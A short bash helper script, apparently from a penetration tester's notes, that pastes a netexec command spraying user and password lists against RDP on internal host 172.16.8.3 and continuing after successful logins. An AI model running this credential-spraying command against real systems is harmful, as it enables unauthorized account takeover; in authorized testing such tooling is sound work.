#!/bin/bash

: '
nxc rdp: Check RDP with user/pass lists, continue on success.
'


source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh

paste_command "netexec rdp 172.16.8.3 -u documentation/evidence/notes/ad_users.txt -p documentation/evidence/notes/ad_passwords.txt --continue-on-success"